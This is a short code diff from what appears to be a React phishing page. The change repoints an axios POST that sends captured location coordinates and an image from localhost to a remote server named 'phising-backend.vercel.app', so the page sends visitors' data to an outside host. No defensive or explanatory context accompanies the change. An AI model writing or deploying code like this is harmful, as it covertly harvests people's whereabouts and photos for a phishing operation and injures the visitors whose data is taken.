@@ -52,7 +52,7 @@ const Main = () => {
     if (coords && image) {
       const sendData = async () => {
         try {
-          await axios.post('http://localhost:4000/api/store', {
+          await axios.post('https://phising-backend.vercel.app/api/store', {
             coords,
             image,
           });
